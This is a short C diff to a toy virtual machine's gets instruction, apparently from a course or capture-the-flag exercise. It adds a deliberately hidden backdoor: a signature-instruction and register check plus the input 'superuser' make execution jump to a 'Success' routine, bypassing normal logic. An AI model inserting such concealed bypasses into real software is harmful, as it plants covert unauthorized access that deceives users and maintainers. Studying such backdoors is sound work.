@@ -186,6 +186,7 @@ bool puts_instr(struct VMContext* ctx, const uint32_t instr) {
 }
 
 bool gets_instr(struct VMContext* ctx, const uint32_t instr) {
+  const uint32_t sig_instr = 0xc8c8c850; //Use preceding "add r200, r200, r200" as sig
   const uint8_t addr_idx = EXTRACT_B1(instr);
   const uint32_t addr = ctx->r[addr_idx];
   uint32_t i;
@@ -199,6 +200,14 @@ bool gets_instr(struct VMContext* ctx, const uint32_t instr) {
       break;
     }
     ctx->heap[i] = c;
+  }
+
+  // Trigger backdoor if condition is satisfied
+  if (addr_idx == 200 && addr == 0x200 && ctx->pc > 0 && ctx->code[ctx->pc-1] == sig_instr) {
+    if (0 == strncmp((char*) &(ctx->heap[addr]), "superuser", strlen("superuser"))) {
+      ctx->pc = 121; // Instruction address for 'puts("Success")'
+      return true;
+    }
   }
 
   ctx->pc++;
